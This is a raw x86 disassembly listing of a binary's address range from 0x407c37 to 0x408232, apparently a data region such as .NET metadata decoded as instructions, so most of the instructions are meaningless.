  407c37:	00 e1                	add    %ah,%cl
  407c39:	01 90 09 9e 00 30    	add    %edx,0x30009e09(%eax)
  407c3f:	00 d8                	add    %bl,%al
  407c41:	36 00 00             	add    %al,%ss:(%eax)
  407c44:	00 00                	add    %al,(%eax)
  407c46:	e1 01                	loope  0x407c49
  407c48:	63 19                	arpl   %ebx,(%ecx)
  407c4a:	52                   	push   %edx
  407c4b:	00 31                	add    %dh,(%ecx)
  407c4d:	00 45 21             	add    %al,0x21(%ebp)
  407c50:	00 00                	add    %al,(%eax)
  407c52:	00 00                	add    %al,(%eax)
  407c54:	e1 01                	loope  0x407c57
  407c56:	90                   	nop
  407c57:	09 9e 00 31 00 b8    	or     %ebx,-0x47ffcf00(%esi)
  407c5d:	39 00                	cmp    %eax,(%eax)
  407c5f:	00 00                	add    %al,(%eax)
  407c61:	00 e1                	add    %ah,%cl
  407c63:	01 63 19             	add    %esp,0x19(%ebx)
  407c66:	52                   	push   %edx
  407c67:	00 32                	add    %dh,(%edx)
  407c69:	00 53 21             	add    %dl,0x21(%ebx)
  407c6c:	00 00                	add    %al,(%eax)
  407c6e:	00 00                	add    %al,(%eax)
  407c70:	e1 01                	loope  0x407c73
  407c72:	90                   	nop
  407c73:	09 9e 00 32 00 14    	or     %ebx,0x14003200(%esi)
  407c79:	3c 00                	cmp    $0x0,%al
  407c7b:	00 00                	add    %al,(%eax)
  407c7d:	00 e1                	add    %ah,%cl
  407c7f:	01 63 19             	add    %esp,0x19(%ebx)
  407c82:	52                   	push   %edx
  407c83:	00 33                	add    %dh,(%ebx)
  407c85:	00 61 21             	add    %ah,0x21(%ecx)
  407c88:	00 00                	add    %al,(%eax)
  407c8a:	00 00                	add    %al,(%eax)
  407c8c:	e1 01                	loope  0x407c8f
  407c8e:	90                   	nop
  407c8f:	09 9e 00 33 00 00    	or     %ebx,0x3300(%esi)
  407c95:	00 00                	add    %al,(%eax)
  407c97:	00 80 00 91 20 01    	add    %al,0x1209100(%eax)
  407c9d:	12 fe                	adc    %dh,%bh
  407c9f:	00 34 00             	add    %dh,(%eax,%eax,1)
  407ca2:	6f                   	outsl  %ds:(%esi),(%dx)
  407ca3:	21 00                	and    %eax,(%eax)
  407ca5:	00 00                	add    %al,(%eax)
  407ca7:	00 86 18 88 14 07    	add    %al,0x7148818(%esi)
  407cad:	01 37                	add    %esi,(%edi)
  407caf:	00 a5 21 00 00 00    	add    %ah,0x21(%ebp)
  407cb5:	00 86 00 15 08 bc    	add    %al,-0x43f7eb00(%esi)
  407cbb:	00 39                	add    %bh,(%ecx)
  407cbd:	00 e8                	add    %ch,%al
  407cbf:	3d 00 00 00 00       	cmp    $0x0,%eax
  407cc4:	86 00                	xchg   %al,(%eax)
  407cc6:	4b                   	dec    %ebx
  407cc7:	17                   	pop    %ss
  407cc8:	52                   	push   %edx
  407cc9:	00 3a                	add    %bh,(%edx)
  407ccb:	00 20                	add    %ah,(%eax)
  407ccd:	3e 00 00             	add    %al,%ds:(%eax)
  407cd0:	00 00                	add    %al,(%eax)
  407cd2:	86 00                	xchg   %al,(%eax)
  407cd4:	ce                   	into
  407cd5:	06                   	push   %es
  407cd6:	13 01                	adc    (%ecx),%eax
  407cd8:	3a 00                	cmp    (%eax),%al
  407cda:	7c 3e                	jl     0x407d1a
  407cdc:	00 00                	add    %al,(%eax)
  407cde:	00 00                	add    %al,(%eax)
  407ce0:	86 00                	xchg   %al,(%eax)
  407ce2:	87 07                	xchg   %eax,(%edi)
  407ce4:	29 01                	sub    %eax,(%ecx)
  407ce6:	3d 00 b4 3e 00       	cmp    $0x3eb400,%eax
  407ceb:	00 00                	add    %al,(%eax)
  407ced:	00 86 00 c1 06 2d    	add    %al,0x2d06c100(%esi)
  407cf3:	01 3d 00 f8 3e 00    	add    %edi,0x3ef800
  407cf9:	00 00                	add    %al,(%eax)
  407cfb:	00 86 00 94 06 36    	add    %al,0x36069400(%esi)
  407d01:	01 3d 00 b3 21 00    	add    %edi,0x21b300
  407d07:	00 00                	add    %al,(%eax)
  407d09:	00 81 00 e5 09 40    	add    %al,0x4009e500(%ecx)
  407d0f:	01 3e                	add    %edi,(%esi)
  407d11:	00 cd                	add    %cl,%ch
  407d13:	21 00                	and    %eax,(%eax)
  407d15:	00 00                	add    %al,(%eax)
  407d17:	00 86 00 e3 18 48    	add    %al,0x4818e300(%esi)
  407d1d:	01 40 00             	add    %eax,0x0(%eax)
  407d20:	db 21                	(bad) (%ecx)
  407d22:	00 00                	add    %al,(%eax)
  407d24:	00 00                	add    %al,(%eax)
  407d26:	86 00                	xchg   %al,(%eax)
  407d28:	f2 18 52 00          	repnz sbb %dl,0x0(%edx)
  407d2c:	41                   	inc    %ecx
  407d2d:	00 44 3f 00          	add    %al,0x0(%edi,%edi,1)
  407d31:	00 00                	add    %al,(%eax)
  407d33:	00 86 00 af 06 4d    	add    %al,0x4d06af00(%esi)
  407d39:	01 41 00             	add    %eax,0x0(%ecx)
  407d3c:	98                   	cwtl
  407d3d:	3f                   	aas
  407d3e:	00 00                	add    %al,(%eax)
  407d40:	00 00                	add    %al,(%eax)
  407d42:	e1 01                	loope  0x407d45
  407d44:	63 19                	arpl   %ebx,(%ecx)
  407d46:	52                   	push   %edx
  407d47:	00 43 00             	add    %al,0x0(%ebx)
  407d4a:	e8 21 00 00 00       	call   0x407d70
  407d4f:	00 e1                	add    %ah,%cl
  407d51:	01 90 09 9e 00 43    	add    %edx,0x43009e09(%eax)
  407d57:	00 6c 41 00          	add    %ch,0x0(%ecx,%eax,2)
  407d5b:	00 00                	add    %al,(%eax)
  407d5d:	00 e1                	add    %ah,%cl
  407d5f:	01 63 19             	add    %esp,0x19(%ebx)
  407d62:	52                   	push   %edx
  407d63:	00 44 00 f6          	add    %al,-0xa(%eax,%eax,1)
  407d67:	21 00                	and    %eax,(%eax)
  407d69:	00 00                	add    %al,(%eax)
  407d6b:	00 e1                	add    %ah,%cl
  407d6d:	01 90 09 9e 00 44    	add    %edx,0x44009e09(%eax)
  407d73:	00 7c 44 00          	add    %bh,0x0(%esp,%eax,2)
  407d77:	00 00                	add    %al,(%eax)
  407d79:	00 e1                	add    %ah,%cl
  407d7b:	01 63 19             	add    %esp,0x19(%ebx)
  407d7e:	52                   	push   %edx
  407d7f:	00 45 00             	add    %al,0x0(%ebp)
  407d82:	04 22                	add    $0x22,%al
  407d84:	00 00                	add    %al,(%eax)
  407d86:	00 00                	add    %al,(%eax)
  407d88:	e1 01                	loope  0x407d8b
  407d8a:	90                   	nop
  407d8b:	09 9e 00 45 00 4c    	or     %ebx,0x4c004500(%esi)
  407d91:	45                   	inc    %ebp
  407d92:	00 00                	add    %al,(%eax)
  407d94:	00 00                	add    %al,(%eax)
  407d96:	e1 01                	loope  0x407d99
  407d98:	63 19                	arpl   %ebx,(%ecx)
  407d9a:	52                   	push   %edx
  407d9b:	00 46 00             	add    %al,0x0(%esi)
  407d9e:	12 22                	adc    (%edx),%ah
  407da0:	00 00                	add    %al,(%eax)
  407da2:	00 00                	add    %al,(%eax)
  407da4:	e1 01                	loope  0x407da7
  407da6:	90                   	nop
  407da7:	09 9e 00 46 00 1c    	or     %ebx,0x1c004600(%esi)
  407dad:	46                   	inc    %esi
  407dae:	00 00                	add    %al,(%eax)
  407db0:	00 00                	add    %al,(%eax)
  407db2:	e1 01                	loope  0x407db5
  407db4:	63 19                	arpl   %ebx,(%ecx)
  407db6:	52                   	push   %edx
  407db7:	00 47 00             	add    %al,0x0(%edi)
  407dba:	20 22                	and    %ah,(%edx)
  407dbc:	00 00                	add    %al,(%eax)
  407dbe:	00 00                	add    %al,(%eax)
  407dc0:	e1 01                	loope  0x407dc3
  407dc2:	90                   	nop
  407dc3:	09 9e 00 47 00 2e    	or     %ebx,0x2e004700(%esi)
  407dc9:	22 00                	and    (%eax),%al
  407dcb:	00 00                	add    %al,(%eax)
  407dcd:	00 86 18 88 14 52    	add    %al,0x52148818(%esi)
  407dd3:	00 48 00             	add    %cl,0x0(%eax)
  407dd6:	3d 22 00 00 00       	cmp    $0x22,%eax
  407ddb:	00 86 18 88 14 79    	add    %al,0x79148818(%esi)
  407de1:	01 48 00             	add    %ecx,0x0(%eax)
  407de4:	f0 49                	lock dec %ecx
  407de6:	00 00                	add    %al,(%eax)
  407de8:	00 00                	add    %al,(%eax)
  407dea:	81 00 e3 12 81 01    	addl   $0x18112e3,(%eax)
  407df0:	4a                   	dec    %edx
  407df1:	00 3c 4a             	add    %bh,(%edx,%ecx,2)
  407df4:	00 00                	add    %al,(%eax)
  407df6:	00 00                	add    %al,(%eax)
  407df8:	81 00 cb 12 81 01    	addl   $0x18112cb,(%eax)
  407dfe:	4b                   	dec    %ebx
  407dff:	00 88 4a 00 00 00    	add    %cl,0x4a(%eax)
  407e05:	00 96 00 cf 16 a4    	add    %dl,-0x5be93100(%esi)
  407e0b:	00 4c 00 dc          	add    %cl,-0x24(%eax,%eax,1)
  407e0f:	4a                   	dec    %edx
  407e10:	00 00                	add    %al,(%eax)
  407e12:	00 00                	add    %al,(%eax)
  407e14:	81 00 37 12 8b 01    	addl   $0x18b1237,(%eax)
  407e1a:	4e                   	dec    %esi
  407e1b:	00 1c 4b             	add    %bl,(%ebx,%ecx,2)
  407e1e:	00 00                	add    %al,(%eax)
  407e20:	00 00                	add    %al,(%eax)
  407e22:	86 00                	xchg   %al,(%eax)
  407e24:	1b 0a                	sbb    (%edx),%ecx
  407e26:	92                   	xchg   %eax,%edx
  407e27:	01 4f 00             	add    %ecx,0x0(%edi)
  407e2a:	44                   	inc    %esp
  407e2b:	4b                   	dec    %ebx
  407e2c:	00 00                	add    %al,(%eax)
  407e2e:	00 00                	add    %al,(%eax)
  407e30:	86 00                	xchg   %al,(%eax)
  407e32:	94                   	xchg   %eax,%esp
  407e33:	06                   	push   %es
  407e34:	36 01 51 00          	add    %edx,%ss:0x0(%ecx)
  407e38:	90                   	nop
  407e39:	4b                   	dec    %ebx
  407e3a:	00 00                	add    %al,(%eax)
  407e3c:	00 00                	add    %al,(%eax)
  407e3e:	86 00                	xchg   %al,(%eax)
  407e40:	c1 06 2d             	roll   $0x2d,(%esi)
  407e43:	01 52 00             	add    %edx,0x0(%edx)
  407e46:	d4 4b                	aam    $0x4b
  407e48:	00 00                	add    %al,(%eax)
  407e4a:	00 00                	add    %al,(%eax)
  407e4c:	86 00                	xchg   %al,(%eax)
  407e4e:	ba 17 9a 01 52       	mov    $0x52019a17,%edx
  407e53:	00 24 4c             	add    %ah,(%esp,%ecx,2)
  407e56:	00 00                	add    %al,(%eax)
  407e58:	00 00                	add    %al,(%eax)
  407e5a:	86 00                	xchg   %al,(%eax)
  407e5c:	74 15                	je     0x407e73
  407e5e:	a1 01 54 00 5f       	mov    0x5f005401,%eax
  407e63:	22 00                	and    (%eax),%al
  407e65:	00 00                	add    %al,(%eax)
  407e67:	00 86 00 e3 18 48    	add    %al,0x4818e300(%esi)
  407e6d:	01 55 00             	add    %edx,0x0(%ebp)
  407e70:	74 22                	je     0x407e94
  407e72:	00 00                	add    %al,(%eax)
  407e74:	00 00                	add    %al,(%eax)
  407e76:	86 00                	xchg   %al,(%eax)
  407e78:	f2 18 52 00          	repnz sbb %dl,0x0(%edx)
  407e7c:	56                   	push   %esi
  407e7d:	00 7c 4c 00          	add    %bh,0x0(%esp,%ecx,2)
  407e81:	00 00                	add    %al,(%eax)
  407e83:	00 e1                	add    %ah,%cl
  407e85:	01 63 19             	add    %esp,0x19(%ebx)
  407e88:	52                   	push   %edx
  407e89:	00 56 00             	add    %dl,0x0(%esi)
  407e8c:	89 22                	mov    %esp,(%edx)
  407e8e:	00 00                	add    %al,(%eax)
  407e90:	00 00                	add    %al,(%eax)
  407e92:	e1 01                	loope  0x407e95
  407e94:	90                   	nop
  407e95:	09 9e 00 56 00 fc    	or     %ebx,-0x3ffaa00(%esi)
  407e9b:	4d                   	dec    %ebp
  407e9c:	00 00                	add    %al,(%eax)
  407e9e:	00 00                	add    %al,(%eax)
  407ea0:	e1 01                	loope  0x407ea3
  407ea2:	63 19                	arpl   %ebx,(%ecx)
  407ea4:	52                   	push   %edx
  407ea5:	00 57 00             	add    %dl,0x0(%edi)
  407ea8:	97                   	xchg   %eax,%edi
  407ea9:	22 00                	and    (%eax),%al
  407eab:	00 00                	add    %al,(%eax)
  407ead:	00 e1                	add    %ah,%cl
  407eaf:	01 90 09 9e 00 57    	add    %edx,0x57009e09(%eax)
  407eb5:	00 a5 22 00 00 00    	add    %ah,0x22(%ebp)
  407ebb:	00 91 18 8e 14 c3    	add    %dl,-0x3ceb71e8(%ecx)
  407ec1:	01 58 00             	add    %ebx,0x0(%eax)
  407ec4:	78 20                	js     0x407ee6
  407ec6:	00 00                	add    %al,(%eax)
  407ec8:	00 00                	add    %al,(%eax)
  407eca:	86 18                	xchg   %bl,(%eax)
  407ecc:	88 14 52             	mov    %dl,(%edx,%edx,2)
  407ecf:	00 58 00             	add    %bl,0x0(%eax)
  407ed2:	b1 22                	mov    $0x22,%cl
  407ed4:	00 00                	add    %al,(%eax)
  407ed6:	00 00                	add    %al,(%eax)
  407ed8:	83 00 93             	addl   $0xffffff93,(%eax)
  407edb:	00 c7                	add    %al,%bh
  407edd:	01 58 00             	add    %ebx,0x0(%eax)
  407ee0:	e8 50 00 00 00       	call   0x407f35
  407ee5:	00 e1                	add    %ah,%cl
  407ee7:	01 63 19             	add    %esp,0x19(%ebx)
  407eea:	52                   	push   %edx
  407eeb:	00 59 00             	add    %bl,0x0(%ecx)
  407eee:	b4 22                	mov    $0x22,%ah
  407ef0:	00 00                	add    %al,(%eax)
  407ef2:	00 00                	add    %al,(%eax)
  407ef4:	e1 01                	loope  0x407ef7
  407ef6:	90                   	nop
  407ef7:	09 9e 00 59 00 b4    	or     %ebx,-0x4bffa700(%esi)
  407efd:	52                   	push   %edx
  407efe:	00 00                	add    %al,(%eax)
  407f00:	00 00                	add    %al,(%eax)
  407f02:	e1 01                	loope  0x407f05
  407f04:	63 19                	arpl   %ebx,(%ecx)
  407f06:	52                   	push   %edx
  407f07:	00 5a 00             	add    %bl,0x0(%edx)
  407f0a:	c2 22 00             	ret    $0x22
  407f0d:	00 00                	add    %al,(%eax)
  407f0f:	00 e1                	add    %ah,%cl
  407f11:	01 90 09 9e 00 5a    	add    %edx,0x5a009e09(%eax)
  407f17:	00 f0                	add    %dh,%al
  407f19:	54                   	push   %esp
  407f1a:	00 00                	add    %al,(%eax)
  407f1c:	00 00                	add    %al,(%eax)
  407f1e:	91                   	xchg   %eax,%ecx
  407f1f:	00 1d 10 d5 01 5b    	add    %bl,0x5b01d510
  407f25:	00 d0                	add    %dl,%al
  407f27:	22 00                	and    (%eax),%al
  407f29:	00 00                	add    %al,(%eax)
  407f2b:	00 96 00 39 17 dc    	add    %dl,-0x23e8c700(%esi)
  407f31:	01 5c 00 24          	add    %ebx,0x24(%eax,%eax,1)
  407f35:	58                   	pop    %eax
  407f36:	00 00                	add    %al,(%eax)
  407f38:	00 00                	add    %al,(%eax)
  407f3a:	91                   	xchg   %eax,%ecx
  407f3b:	00 21                	add    %ah,(%ecx)
  407f3d:	11 e2                	adc    %esp,%edx
  407f3f:	01 5d 00             	add    %ebx,0x0(%ebp)
  407f42:	78 20                	js     0x407f64
  407f44:	00 00                	add    %al,(%eax)
  407f46:	00 00                	add    %al,(%eax)
  407f48:	86 18                	xchg   %bl,(%eax)
  407f4a:	88 14 52             	mov    %dl,(%edx,%edx,2)
  407f4d:	00 5f 00             	add    %bl,0x0(%edi)
  407f50:	04 59                	add    $0x59,%al
  407f52:	00 00                	add    %al,(%eax)
  407f54:	00 00                	add    %al,(%eax)
  407f56:	91                   	xchg   %eax,%ecx
  407f57:	18 8e 14 c3 01 5f    	sbb    %cl,0x5f01c314(%esi)
  407f5d:	00 84 59 00 00 00 00 	add    %al,0x0(%ecx,%ebx,2)
  407f64:	91                   	xchg   %eax,%ecx
  407f65:	08 b0 05 e9 01 5f    	or     %dh,0x5f01e905(%eax)
  407f6b:	00 a4 59 00 00 00 00 	add    %ah,0x0(%ecx,%ebx,2)
  407f72:	e1 01                	loope  0x407f75
  407f74:	63 19                	arpl   %ebx,(%ecx)
  407f76:	52                   	push   %edx
  407f77:	00 60 00             	add    %ah,0x0(%eax)
  407f7a:	dd 22                	frstor (%edx)
  407f7c:	00 00                	add    %al,(%eax)
  407f7e:	00 00                	add    %al,(%eax)
  407f80:	e1 01                	loope  0x407f83
  407f82:	90                   	nop
  407f83:	09 9e 00 60 00 eb    	or     %ebx,-0x14ffa000(%esi)
  407f89:	22 00                	and    (%eax),%al
  407f8b:	00 00                	add    %al,(%eax)
  407f8d:	00 86 18 88 14 f3    	add    %al,-0xceb77e8(%esi)
  407f93:	01 61 00             	add    %esp,0x0(%ecx)
  407f96:	fa                   	cli
  407f97:	22 00                	and    (%eax),%al
  407f99:	00 00                	add    %al,(%eax)
  407f9b:	00 c6                	add    %al,%dh
  407f9d:	08 a5 0d f9 01 62    	or     %ah,0x6201f90d(%ebp)
  407fa3:	00 07                	add    %al,(%edi)
  407fa5:	23 00                	and    (%eax),%eax
  407fa7:	00 00                	add    %al,(%eax)
  407fa9:	00 c6                	add    %al,%dh
  407fab:	00 3e                	add    %bh,(%esi)
  407fad:	0a fe                	or     %dh,%bh
  407faf:	01 62 00             	add    %esp,0x0(%edx)
  407fb2:	21 23                	and    %esp,(%ebx)
  407fb4:	00 00                	add    %al,(%eax)
  407fb6:	00 00                	add    %al,(%eax)
  407fb8:	c6 00 67             	movb   $0x67,(%eax)
  407fbb:	09 03                	or     %eax,(%ebx)
  407fbd:	02 63 00             	add    0x0(%ebx),%ah
  407fc0:	3b 23                	cmp    (%ebx),%esp
  407fc2:	00 00                	add    %al,(%eax)
  407fc4:	00 00                	add    %al,(%eax)
  407fc6:	86 00                	xchg   %al,(%eax)
  407fc8:	23 19                	and    (%ecx),%ebx
  407fca:	08 02                	or     %al,(%edx)
  407fcc:	64 00 47 23          	add    %al,%fs:0x23(%edi)
  407fd0:	00 00                	add    %al,(%eax)
  407fd2:	00 00                	add    %al,(%eax)
  407fd4:	86 00                	xchg   %al,(%eax)
  407fd6:	0f 19 52 00          	nopl   0x0(%edx)
  407fda:	64 00 00             	add    %al,%fs:(%eax)
  407fdd:	00 00                	add    %al,(%eax)
  407fdf:	00 80 00 91 20 3e    	add    %al,0x3e209100(%eax)
  407fe5:	10 11                	adc    %dl,(%ecx)
  407fe7:	02 64 00 00          	add    0x0(%eax,%eax,1),%ah
  407feb:	00 00                	add    %al,(%eax)
  407fed:	00 80 00 91 20 b7    	add    %al,-0x48df6f00(%eax)
  407ff3:	19 17                	sbb    %edx,(%edi)
  407ff5:	02 65 00             	add    0x0(%ebp),%ah
  407ff8:	00 00                	add    %al,(%eax)
  407ffa:	00 00                	add    %al,(%eax)
  407ffc:	80 00 91             	addb   $0x91,(%eax)
  407fff:	20 85 19 1b 02 65    	and    %al,0x65021b19(%ebp)
  408005:	00 00                	add    %al,(%eax)
  408007:	00 00                	add    %al,(%eax)
  408009:	00 80 00 91 20 9d    	add    %al,-0x62df6f00(%eax)
  40800f:	0e                   	push   %cs
  408010:	23 02                	and    (%edx),%eax
  408012:	68 00 00 00 00       	push   $0x0
  408017:	00 80 00 91 20 37    	add    %al,0x37209100(%eax)
  40801d:	07                   	pop    %es
  40801e:	28 02                	sub    %al,(%edx)
  408020:	69 00 00 00 00 00    	imul   $0x0,(%eax),%eax
  408026:	80 00 91             	addb   $0x91,(%eax)
  408029:	20 ce                	and    %cl,%dh
  40802b:	11 2f                	adc    %ebp,(%edi)
  40802d:	02 6b 00             	add    0x0(%ebx),%ch
  408030:	00 00                	add    %al,(%eax)
  408032:	00 00                	add    %al,(%eax)
  408034:	80 00 91             	addb   $0x91,(%eax)
  408037:	20 8b 08 37 02 6c    	and    %cl,0x6c023708(%ebx)
  40803d:	00 d4                	add    %dl,%ah
  40803f:	5e                   	pop    %esi
  408040:	00 00                	add    %al,(%eax)
  408042:	00 00                	add    %al,(%eax)
  408044:	96                   	xchg   %eax,%esi
  408045:	00 0e                	add    %cl,(%esi)
  408047:	07                   	pop    %es
  408048:	3c 02                	cmp    $0x2,%al
  40804a:	6d                   	insl   (%dx),%es:(%edi)
  40804b:	00 10                	add    %dl,(%eax)
  40804d:	5f                   	pop    %edi
  40804e:	00 00                	add    %al,(%eax)
  408050:	00 00                	add    %al,(%eax)
  408052:	96                   	xchg   %eax,%esi
  408053:	00 cb                	add    %cl,%bl
  408055:	19 44 02 6d          	sbb    %eax,0x6d(%edx,%eax,1)
  408059:	00 a8 5f 00 00 00    	add    %ch,0x5f(%eax)
  40805f:	00 96 00 73 10 11    	add    %dl,0x11107300(%esi)
  408065:	02 6d 00             	add    0x0(%ebp),%ch
  408068:	d4 5f                	aam    $0x5f
  40806a:	00 00                	add    %al,(%eax)
  40806c:	00 00                	add    %al,(%eax)
  40806e:	96                   	xchg   %eax,%esi
  40806f:	00 b9 16 44 02 6d    	add    %bh,0x6d024416(%ecx)
  408075:	00 d0                	add    %dl,%al
  408077:	60                   	pusha
  408078:	00 00                	add    %al,(%eax)
  40807a:	00 00                	add    %al,(%eax)
  40807c:	96                   	xchg   %eax,%esi
  40807d:	00 8e 10 44 02 6d    	add    %cl,0x6d024410(%esi)
  408083:	00 80 61 00 00 00    	add    %al,0x61(%eax)
  408089:	00 96 00 17 06 44    	add    %dl,0x44061700(%esi)
  40808f:	02 6d 00             	add    0x0(%ebp),%ch
  408092:	fc                   	cld
  408093:	61                   	popa
  408094:	00 00                	add    %al,(%eax)
  408096:	00 00                	add    %al,(%eax)
  408098:	96                   	xchg   %eax,%esi
  408099:	00 44 0e 48          	add    %al,0x48(%esi,%ecx,1)
  40809d:	02 6d 00             	add    0x0(%ebp),%ch
  4080a0:	64 62 00             	bound  %eax,%fs:(%eax)
  4080a3:	00 00                	add    %al,(%eax)
  4080a5:	00 96 00 ec 06 4d    	add    %dl,0x4d06ec00(%esi)
  4080ab:	02 6e 00             	add    0x0(%esi),%ch
  4080ae:	c8 62 00 00          	enter  $0x62,$0x0
  4080b2:	00 00                	add    %al,(%eax)
  4080b4:	96                   	xchg   %eax,%esi
  4080b5:	00 08                	add    %cl,(%eax)
  4080b7:	12 62 02             	adc    0x2(%edx),%ah
  4080ba:	73 00                	jae    0x4080bc
  4080bc:	0c 63                	or     $0x63,%al
  4080be:	00 00                	add    %al,(%eax)
  4080c0:	00 00                	add    %al,(%eax)
  4080c2:	96                   	xchg   %eax,%esi
  4080c3:	00 29                	add    %ch,(%ecx)
  4080c5:	0f 68 02             	punpckhbw (%edx),%mm0
  4080c8:	74 00                	je     0x4080ca
  4080ca:	48                   	dec    %eax
  4080cb:	63 00                	arpl   %eax,(%eax)
  4080cd:	00 00                	add    %al,(%eax)
  4080cf:	00 96 00 4c 10 6d    	add    %dl,0x6d104c00(%esi)
  4080d5:	02 74 00 94          	add    -0x6c(%eax,%eax,1),%dh
  4080d9:	63 00                	arpl   %eax,(%eax)
  4080db:	00 00                	add    %al,(%eax)
  4080dd:	00 96 00 61 10 6d    	add    %dl,0x6d106100(%esi)
  4080e3:	02 76 00             	add    0x0(%esi),%dh
  4080e6:	e0 63                	loopne 0x40814b
  4080e8:	00 00                	add    %al,(%eax)
  4080ea:	00 00                	add    %al,(%eax)
  4080ec:	96                   	xchg   %eax,%esi
  4080ed:	00 9e 06 9a 02 78    	add    %bl,0x78029a06(%esi)
  4080f3:	00 1c 64             	add    %bl,(%esp,%eiz,2)
  4080f6:	00 00                	add    %al,(%eax)
  4080f8:	00 00                	add    %al,(%eax)
  4080fa:	96                   	xchg   %eax,%esi
  4080fb:	00 40 09             	add    %al,0x9(%eax)
  4080fe:	a2 02 78 00 78       	mov    %al,0x78007802
  408103:	20 00                	and    %al,(%eax)
  408105:	00 00                	add    %al,(%eax)
  408107:	00 86 18 88 14 52    	add    %al,0x52148818(%esi)
  40810d:	00 78 00             	add    %bh,0x0(%eax)
  408110:	54                   	push   %esp
  408111:	23 00                	and    (%eax),%eax
  408113:	00 00                	add    %al,(%eax)
  408115:	00 91 18 8e 14 c3    	add    %dl,-0x3ceb71e8(%ecx)
  40811b:	01 78 00             	add    %edi,0x0(%eax)
  40811e:	78 20                	js     0x408140
  408120:	00 00                	add    %al,(%eax)
  408122:	00 00                	add    %al,(%eax)
  408124:	86 18                	xchg   %bl,(%eax)
  408126:	88 14 52             	mov    %dl,(%edx,%edx,2)
  408129:	00 78 00             	add    %bh,0x0(%eax)
  40812c:	60                   	pusha
  40812d:	23 00                	and    (%eax),%eax
  40812f:	00 00                	add    %al,(%eax)
  408131:	00 83 00 c1 00 08    	add    %al,0x800c100(%ebx)
  408137:	02 78 00             	add    0x0(%eax),%bh
  40813a:	67 23 00             	and    (%bx,%si),%eax
  40813d:	00 00                	add    %al,(%eax)
  40813f:	00 83 00 5a 00 bc    	add    %al,-0x43ffa600(%ebx)
  408145:	02 78 00             	add    0x0(%eax),%bh
  408148:	54                   	push   %esp
  408149:	64 00 00             	add    %al,%fs:(%eax)
  40814c:	00 00                	add    %al,(%eax)
  40814e:	e1 01                	loope  0x408151
  408150:	63 19                	arpl   %ebx,(%ecx)
  408152:	52                   	push   %edx
  408153:	00 78 00             	add    %bh,0x0(%eax)
  408156:	6e                   	outsb  %ds:(%esi),(%dx)
  408157:	23 00                	and    (%eax),%eax
  408159:	00 00                	add    %al,(%eax)
  40815b:	00 e1                	add    %ah,%cl
  40815d:	01 90 09 9e 00 78    	add    %edx,0x78009e09(%eax)
  408163:	00 20                	add    %ah,(%eax)
  408165:	65 00 00             	add    %al,%gs:(%eax)
  408168:	00 00                	add    %al,(%eax)
  40816a:	e1 01                	loope  0x40816d
  40816c:	63 19                	arpl   %ebx,(%ecx)
  40816e:	52                   	push   %edx
  40816f:	00 79 00             	add    %bh,0x0(%ecx)
  408172:	7c 23                	jl     0x408197
  408174:	00 00                	add    %al,(%eax)
  408176:	00 00                	add    %al,(%eax)
  408178:	e1 01                	loope  0x40817b
  40817a:	90                   	nop
  40817b:	09 9e 00 79 00 78    	or     %ebx,0x78007900(%esi)
  408181:	20 00                	and    %al,(%eax)
  408183:	00 00                	add    %al,(%eax)
  408185:	00 86 18 88 14 52    	add    %al,0x52148818(%esi)
  40818b:	00 7a 00             	add    %bh,0x0(%edx)
  40818e:	30 66 00             	xor    %ah,0x0(%esi)
  408191:	00 00                	add    %al,(%eax)
  408193:	00 83 00 02 01 52    	add    %al,0x52010200(%ebx)
  408199:	00 7a 00             	add    %bh,0x0(%edx)
  40819c:	38 69 00             	cmp    %ch,0x0(%ecx)
  40819f:	00 00                	add    %al,(%eax)
  4081a1:	00 e1                	add    %ah,%cl
  4081a3:	01 63 19             	add    %esp,0x19(%ebx)
  4081a6:	52                   	push   %edx
  4081a7:	00 7a 00             	add    %bh,0x0(%edx)
  4081aa:	8a 23                	mov    (%ebx),%ah
  4081ac:	00 00                	add    %al,(%eax)
  4081ae:	00 00                	add    %al,(%eax)
  4081b0:	e1 01                	loope  0x4081b3
  4081b2:	90                   	nop
  4081b3:	09 9e 00 7a 00 00    	or     %ebx,0x7a00(%esi)
  4081b9:	6a 00                	push   $0x0
  4081bb:	00 00                	add    %al,(%eax)
  4081bd:	00 e1                	add    %ah,%cl
  4081bf:	01 63 19             	add    %esp,0x19(%ebx)
  4081c2:	52                   	push   %edx
  4081c3:	00 7b 00             	add    %bh,0x0(%ebx)
  4081c6:	98                   	cwtl
  4081c7:	23 00                	and    (%eax),%eax
  4081c9:	00 00                	add    %al,(%eax)
  4081cb:	00 e1                	add    %ah,%cl
  4081cd:	01 90 09 9e 00 7b    	add    %edx,0x7b009e09(%eax)
  4081d3:	00 78 20             	add    %bh,0x20(%eax)
  4081d6:	00 00                	add    %al,(%eax)
  4081d8:	00 00                	add    %al,(%eax)
  4081da:	86 18                	xchg   %bl,(%eax)
  4081dc:	88 14 52             	mov    %dl,(%edx,%edx,2)
  4081df:	00 7c 00 14          	add    %bh,0x14(%eax,%eax,1)
  4081e3:	6b 00 00             	imul   $0x0,(%eax),%eax
  4081e6:	00 00                	add    %al,(%eax)
  4081e8:	83 00 e7             	addl   $0xffffffe7,(%eax)
  4081eb:	00 29                	add    %ch,(%ecx)
  4081ed:	01 7c 00 94          	add    %edi,-0x6c(%eax,%eax,1)
  4081f1:	6b 00 00             	imul   $0x0,(%eax),%eax
  4081f4:	00 00                	add    %al,(%eax)
  4081f6:	e1 01                	loope  0x4081f9
  4081f8:	63 19                	arpl   %ebx,(%ecx)
  4081fa:	52                   	push   %edx
  4081fb:	00 7c 00 a6          	add    %bh,-0x5a(%eax,%eax,1)
  4081ff:	23 00                	and    (%eax),%eax
  408201:	00 00                	add    %al,(%eax)
  408203:	00 e1                	add    %ah,%cl
  408205:	01 90 09 9e 00 7c    	add    %edx,0x7c009e09(%eax)
  40820b:	00 68 6c             	add    %ch,0x6c(%eax)
  40820e:	00 00                	add    %al,(%eax)
  408210:	00 00                	add    %al,(%eax)
  408212:	e1 01                	loope  0x408215
  408214:	63 19                	arpl   %ebx,(%ecx)
  408216:	52                   	push   %edx
  408217:	00 7d 00             	add    %bh,0x0(%ebp)
  40821a:	b4 23                	mov    $0x23,%ah
  40821c:	00 00                	add    %al,(%eax)
  40821e:	00 00                	add    %al,(%eax)
  408220:	e1 01                	loope  0x408223
  408222:	90                   	nop
  408223:	09 9e 00 7d 00 58    	or     %ebx,0x58007d00(%esi)
  408229:	6e                   	outsb  %ds:(%esi),(%dx)
  40822a:	00 00                	add    %al,(%eax)
  40822c:	00 00                	add    %al,(%eax)
  40822e:	e1 01                	loope  0x408231
  408230:	63 19                	arpl   %ebx,(%ecx)
  408232:	52                   	push   %edx
